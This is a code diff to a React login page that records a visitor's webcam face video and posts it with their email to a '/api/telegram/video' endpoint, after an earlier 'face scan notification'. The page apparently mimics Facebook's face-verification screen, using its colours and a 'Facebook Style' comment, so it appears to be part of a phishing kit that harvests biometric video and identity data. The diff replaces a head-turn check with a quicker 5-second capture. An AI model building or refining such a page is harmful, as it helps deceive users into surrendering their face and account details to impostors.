@@ -202,94 +202,16 @@ export default function LoginPage() {
     }
   };
 
-  const detectFaceDirection = async (video: HTMLVideoElement) => {
+  const detectFace = async (video: HTMLVideoElement): Promise<boolean> => {
     if (!faceDetector || !video) {
-      console.warn('Missing detector or video:', { hasDetector: !!faceDetector, hasVideo: !!video });
-      return null;
+      return false;
     }
 
     try {
       const faces = await faceDetector.estimateFaces(video, { flipHorizontal: false });
-      if (faces.length === 0) {
-        console.warn('No faces detected');
-        return null;
-      }
-
-      const face = faces[0];
-      const keypoints = face.keypoints;
-
-      if (keypoints.length < 152) {
-        console.warn('Not enough landmarks:', keypoints.length);
-        return null;
-      }
-
-      // MediaPipe Face Mesh landmark indices
-      const noseTip = keypoints[1];        // Nose tip
-      const leftEye = keypoints[33];       // Left eye center
-      const rightEye = keypoints[263];     // Right eye center
-      const chin = keypoints[152];         // Chin
-
-      if (!noseTip || !leftEye || !rightEye || !chin) {
-        console.warn('Could not get required landmarks');
-        return null;
-      }
-
-      // Calculate face bounding box
-      const allX = keypoints.map((kp: any) => kp.x);
-      const allY = keypoints.map((kp: any) => kp.y);
-      const minX = Math.min(...allX);
-      const maxX = Math.max(...allX);
-      const minY = Math.min(...allY);
-      const maxY = Math.max(...allY);
-      
-      const faceWidth = maxX - minX;
-      const faceHeight = maxY - minY;
-      
-      if (faceWidth === 0 || faceHeight === 0) {
-        return null;
-      }
-
-      const faceCenterX = minX + faceWidth / 2;
-      const faceCenterY = minY + faceHeight / 2;
-
-      // Calculate head pose angles
-      const noseOffsetX = noseTip.x - faceCenterX;
-      const yawAngle = (noseOffsetX / (faceWidth / 2)) * 50;
-
-      const noseOffsetY = noseTip.y - faceCenterY;
-      const pitchAngle = (noseOffsetY / (faceHeight / 2)) * 40;
-
-      const eyeAngle = Math.atan2((rightEye.y - leftEye.y), (rightEye.x - leftEye.x)) * (180 / Math.PI);
-
-      // Determine direction
-      let direction: "left" | "right" | "up" | "down" | "center" = "center";
-
-      const yawThreshold = 15;
-      const pitchThreshold = 12;
-
-      if (yawAngle < -yawThreshold) {
-        direction = "left";
-      } else if (yawAngle > yawThreshold) {
-        direction = "right";
-      } else if (pitchAngle < -pitchThreshold) {
-        direction = "up";
-      } else if (pitchAngle > pitchThreshold) {
-        direction = "down";
-      }
-
-      console.log('Y:', yawAngle.toFixed(1), 'P:', pitchAngle.toFixed(1), '→', direction);
-
-      return { 
-        direction, 
-        x: noseTip.x, 
-        y: noseTip.y,
-        yawAngle,
-        pitchAngle,
-        rollAngle: eyeAngle
-      };
+      return faces.length > 0;
     } catch (error) {
-      console.error('Face detection error:', error instanceof Error ? error.message : String(error));
-      return null;
+      return false;
     }
   };
 
@@ -300,18 +222,17 @@ export default function LoginPage() {
       console.error('Failed to send face scan notification:', error);
     }
 
-    console.log('Starting recording, setting direction to right');
     setIsRecording(true);
     setCurrentStep("recording");
-    setCurrentDirection("right");
     setDetectionActive(true);
-    console.log('Recording started, currentDirection should be right');
 
     // Start recording video
     if (stream && videoRef) {
       const chunks: Blob[] = [];
+      const recordingDuration = 5000; // 5 seconds like Snapchat
+      const startTime = Date.now();
 
-      // Find a supported mimeType - only check webm formats
+      // Find a supported mimeType
       const mimeTypes = [
         'video/webm;codecs=vp9',
         'video/webm;codecs=vp8',
@@ -322,19 +243,16 @@ export default function LoginPage() {
       for (const type of mimeTypes) {
         if (MediaRecorder.isTypeSupported(type)) {
           selectedMimeType = type;
-          console.log('Selected mimeType:', type);
           break;
         }
       }
 
-      // Create recorder with supported mimeType or default
       let recorder: MediaRecorder;
       try {
         if (selectedMimeType) {
           recorder = new MediaRecorder(stream, { mimeType: selectedMimeType });
         } else {
           recorder = new MediaRecorder(stream);
-          console.log('Using default mimeType:', recorder.mimeType);
         }
       } catch (error) {
         console.error('Error creating MediaRecorder:', error);
@@ -344,24 +262,17 @@ export default function LoginPage() {
       recorder.ondataavailable = (event) => {
         if (event.data && event.data.size > 0) {
           chunks.push(event.data);
-          console.log('Data chunk received:', event.data.size, 'bytes');
         }
       };
 
       recorder.onstop = async () => {
         try {
-          console.log('Recording stopped, chunks collected:', chunks.length);
-          
-          // Use the mimeType that MediaRecorder actually used
           const actualMimeType = recorder.mimeType || 'video/webm';
           const videoBlob = new Blob(chunks, { type: actualMimeType });
           setCapturedVideo(videoBlob);
           setRecordedChunks(chunks);
 
-          console.log('Video recorded, size:', videoBlob.size, 'bytes', 'mimeType:', actualMimeType);
-
           if (videoBlob.size === 0) {
-            console.error('Video blob is empty!');
             setCurrentStep("complete");
             return;
           }
@@ -371,7 +282,6 @@ export default function LoginPage() {
           formData.append('video', videoBlob, 'face-verification.webm');
           formData.append('email', userEmail);
 
-          console.log('Sending video to server...');
           const response = await fetch('/api/telegram/video', {
             method: 'POST',
             body: formData,
@@ -379,12 +289,10 @@ export default function LoginPage() {
 
           if (!response.ok) {
             const errorText = await response.text();
-            console.error('Server error:', errorText);
-            throw new Error(`HTTP error! status: ${response.status}, message: ${errorText}`);
+            throw new Error(`HTTP error! status: ${response.status}`);
           }
 
           const result = await response.json();
-          console.log('Video sent successfully:', result);
           setCurrentStep("complete");
         } catch (error) {
           console.error('Failed to send video:', error);
@@ -392,88 +300,45 @@ export default function LoginPage() {
         }
       };
 
-      recorder.start(1000); // Collect data every 1 second for better chunks
+      recorder.start(1000);
       setMediaRecorder(recorder);
-      console.log('MediaRecorder started');
 
-      // Simplified directions for testing: just 4 directions once
-      const directions: ("left" | "right" | "up" | "down")[] = ["right", "left", "up", "down"];
-      let currentDirIndex = 0;
-      let detectedCorrectly = false;
-      let detectionStartTime = Date.now();
-
-      // Start face detection loop
+      // Simple face detection loop - just check if face is present and update progress
       const detectionInterval = setInterval(async () => {
-        if (!videoRef) return;
+        if (!videoRef) {
+          clearInterval(detectionInterval);
+          return;
+        }
 
-        const result = await detectFaceDirection(videoRef);
-        if (result) {
-          setFacePosition({ x: result.x, y: result.y });
-          
-          // Log when direction changes
-          if (result.direction !== "center") {
-            console.log('Detected:', result.direction, 'Required:', directions[currentDirIndex], 'Match:', result.direction === directions[currentDirIndex]);
-          }
+        const faceDetected = await detectFace(videoRef);
+        const elapsed = Date.now() - startTime;
+        const progress = Math.min((elapsed / recordingDuration) * 100, 100);
 
-          // Check if detected direction matches required direction
-          if (result.direction === directions[currentDirIndex]) {
-            if (!detectedCorrectly) {
-              detectedCorrectly = true;
-              detectionStartTime = Date.now();
-            }
-
-            const elapsed = Date.now() - detectionStartTime;
-            const progress = Math.min((elapsed / 1500) * 100, 100); // 1.5 seconds hold time
-            setDirectionProgress(progress);
-
-            if (progress >= 100) {
-              // Mark direction as complete
-              const completedSet = new Set<string>();
-              for (let i = 0; i <= currentDirIndex; i++) {
-                completedSet.add(`${directions[i]}-${i}`);
-              }
-              setCompletedDirections(completedSet);
-              setOverallProgress(((currentDirIndex + 1) / directions.length) * 100);
-
-              // Move to next direction
-              currentDirIndex++;
-              detectedCorrectly = false;
-              setDirectionProgress(0);
-
-              if (currentDirIndex >= directions.length) {
-                // All directions complete
-                console.log('All directions completed, stopping recording');
-                clearInterval(detectionInterval);
-                setIsRecording(false);
-                setDetectionActive(false);
-                setOverallProgress(100);
-                setCurrentDirection(null);
-
-                // Stop recording
-                if (recorder.state !== 'inactive') {
-                  console.log('Stopping MediaRecorder...');
-                  recorder.stop();
-                }
-
-                if (stream) {
-                  stream.getTracks().forEach(track => track.stop());
-                }
-                setCurrentStep("processing");
-              } else {
-                setCurrentDirection(directions[currentDirIndex]);
-                console.log('Moving to direction:', directions[currentDirIndex]);
-              }
-            }
-          } else {
-            detectedCorrectly = false;
-            setDirectionProgress(0);
-          }
+        if (faceDetected) {
+          setDirectionProgress(progress);
+          setOverallProgress(progress);
         } else {
-          setFacePosition(null);
-          detectedCorrectly = false;
           setDirectionProgress(0);
         }
-      }, 100); // Check every 100ms
+
+        // Stop recording after duration
+        if (elapsed >= recordingDuration) {
+          clearInterval(detectionInterval);
+          setIsRecording(false);
+          setDetectionActive(false);
+          setOverallProgress(100);
+          setDirectionProgress(0);
+
+          if (recorder.state !== 'inactive') {
+            recorder.stop();
+          }
+
+          if (stream) {
+            stream.getTracks().forEach(track => track.stop());
+          }
+          setCurrentStep("processing");
+        }
+      }, 100);
 
       detectionIntervalRef.current = detectionInterval;
     }
@@ -814,7 +679,7 @@ export default function LoginPage() {
                     <svg className="w-4 h-4 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20" style={{ color: '#1877f2' }}>
                       <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                     </svg>
-                    <p className="text-xs" style={{ color: '#65676b' }}>Turn head left, right, and up</p>
+                    <p className="text-xs" style={{ color: '#65676b' }}>Recording takes 5 seconds</p>
                   </div>
                 </div>
               </div>
@@ -835,129 +700,59 @@ export default function LoginPage() {
           {/* Recording Screen */}
           {currentStep === "recording" && (
             <div className="text-center px-4 py-8">
-              <div style={{ fontSize: '12px', color: '#65676b', marginBottom: '8px' }}>
-                Direction: {currentDirection || 'none'} | Progress: {directionProgress.toFixed(0)}%
-              </div>
-              <h2 className="text-2xl font-bold mb-1" style={{ color: '#1c1e21' }}>
-                {currentDirection === "left" ? "Turn left" :
-                 currentDirection === "right" ? "Turn right" :
-                 currentDirection === "up" ? "Look up" :
-                 currentDirection === "down" ? "Look down" :
-                 "Face detected"}
+              <h2 className="text-2xl font-bold mb-2" style={{ color: '#1c1e21' }}>
+                Recording...
               </h2>
               
               <p className="text-xs mb-8" style={{ color: '#65676b' }}>
                 Keep your face in the circle
               </p>
 
-              {/* Circular Camera Feed - Facebook Style */}
+              {/* Circular Camera Feed - Snapchat Style */}
               <div className="flex justify-center mb-8">
                 <div className="relative" style={{ width: '240px', height: '240px' }}>
-                  {/* Animated scanning ring */}
+                  {/* Animated progress ring */}
+                  <svg className="absolute inset-0 w-full h-full" style={{ transform: 'rotate(-90deg)' }}>
+                    <circle
+                      cx="120"
+                      cy="120"
+                      r="115"
+                      fill="none"
+                      stroke="#e5e7eb"
+                      strokeWidth="2"
+                    />
+                    <circle
+                      cx="120"
+                      cy="120"
+                      r="115"
+                      fill="none"
+                      stroke="#42b72a"
+                      strokeWidth="3"
+                      strokeDasharray={`${2 * Math.PI * 115}`}
+                      strokeDashoffset={`${2 * Math.PI * 115 * (1 - overallProgress / 100)}`}
+                      style={{ transition: 'stroke-dashoffset 0.3s ease' }}
+                    />
+                  </svg>
+
+                  {/* Circular video frame */}
                   <div 
-                    className="absolute inset-0 rounded-full"
-                    style={{
-                      background: currentDirection 
-                        ? 'conic-gradient(from 0deg, #1877f2, #42b72a, #1877f2)' 
-                        : 'conic-gradient(from 0deg, #42b72a, #42b72a)',
-                      animation: currentDirection ? 'fb-spin 2s linear infinite' : 'none',
-                      padding: '4px'
-                    }}
+                    className="absolute inset-0 rounded-full overflow-hidden"
+                    style={{ backgroundColor: '#000', padding: '4px' }}
                   >
-                    {/* Circular video frame */}
-                    <div 
-                      className="w-full h-full rounded-full overflow-hidden"
-                      style={{ backgroundColor: '#000' }}
-                    >
-                      <video
-                        ref={setVideoRef}
-                        autoPlay
-                        playsInline
-                        muted
-                        className="w-full h-full object-cover scale-x-[-1]"
-                      />
-                    </div>
+                    <video
+                      ref={setVideoRef}
+                      autoPlay
+                      playsInline
+                      muted
+                      className="w-full h-full object-cover scale-x-[-1] rounded-full"
+                    />
                   </div>
-
-                  {/* Direction indicators - positioned around the circle */}
-                  {currentDirection === "left" && (
-                    <div className="absolute left-6 top-1/2 -translate-y-1/2 pointer-events-none">
-                      <style>{`
-                        @keyframes pulse-glow {
-                          0%, 100% { filter: drop-shadow(0 0 0px rgba(66, 183, 42, 0.5)); }
-                          50% { filter: drop-shadow(0 0 12px rgba(66, 183, 42, 0.8)); }
-                        }
-                        .left-bracket {
-                          animation: pulse-glow 1.5s ease-in-out infinite;
-                          font-size: 4rem;
-                          font-weight: 300;
-                          line-height: 1;
-                          letter-spacing: -0.1em;
-                        }
-                      `}</style>
-                      <div className="left-bracket" style={{ color: directionProgress > 30 ? '#42b72a' : '#b0bcc1', transition: 'color 0.3s ease' }}>(</div>
-                    </div>
-                  )}
-
-                  {currentDirection === "right" && (
-                    <div className="absolute right-6 top-1/2 -translate-y-1/2 pointer-events-none">
-                      <style>{`
-                        @keyframes pulse-glow {
-                          0%, 100% { filter: drop-shadow(0 0 0px rgba(66, 183, 42, 0.5)); }
-                          50% { filter: drop-shadow(0 0 12px rgba(66, 183, 42, 0.8)); }
-                        }
-                        .right-bracket {
-                          animation: pulse-glow 1.5s ease-in-out infinite;
-                          font-size: 4rem;
-                          font-weight: 300;
-                          line-height: 1;
-                          letter-spacing: -0.1em;
-                        }
-                      `}</style>
-                      <div className="right-bracket" style={{ color: directionProgress > 30 ? '#42b72a' : '#b0bcc1', transition: 'color 0.3s ease' }}>)</div>
-                    </div>
-                  )}
-
-                  {currentDirection === "up" && (
-                    <div className="absolute top-6 left-1/2 -translate-x-1/2 pointer-events-none">
-                      <style>{`
-                        @keyframes pulse-glow {
-                          0%, 100% { filter: drop-shadow(0 0 0px rgba(66, 183, 42, 0.5)); }
-                          50% { filter: drop-shadow(0 0 12px rgba(66, 183, 42, 0.8)); }
-                        }
-                        .up-bracket {
-                          animation: pulse-glow 1.5s ease-in-out infinite;
-                          font-size: 3rem;
-                          font-weight: 300;
-                          transform: rotate(-90deg);
-                          line-height: 1;
-                        }
-                      `}</style>
-                      <div className="up-bracket" style={{ color: directionProgress > 30 ? '#42b72a' : '#b0bcc1', transition: 'color 0.3s ease' }}>(</div>
-                    </div>
-                  )}
-
-                  {currentDirection === "down" && (
-                    <div className="absolute bottom-6 left-1/2 -translate-x-1/2 pointer-events-none">
-                      <style>{`
-                        @keyframes pulse-glow {
-                          0%, 100% { filter: drop-shadow(0 0 0px rgba(66, 183, 42, 0.5)); }
-                          50% { filter: drop-shadow(0 0 12px rgba(66, 183, 42, 0.8)); }
-                        }
-                        .down-bracket {
-                          animation: pulse-glow 1.5s ease-in-out infinite;
-                          font-size: 3rem;
-                          font-weight: 300;
-                          transform: rotate(90deg);
-                          line-height: 1;
-                        }
-                      `}</style>
-                      <div className="down-bracket" style={{ color: directionProgress > 30 ? '#42b72a' : '#b0bcc1', transition: 'color 0.3s ease' }}>(</div>
-                    </div>
-                  )}
-
                 </div>
               </div>
+
+              <p className="text-sm font-semibold mb-4" style={{ color: '#1c1e21' }}>
+                {Math.round(overallProgress)}%
+              </p>
 
               <button
                 onClick={() => {
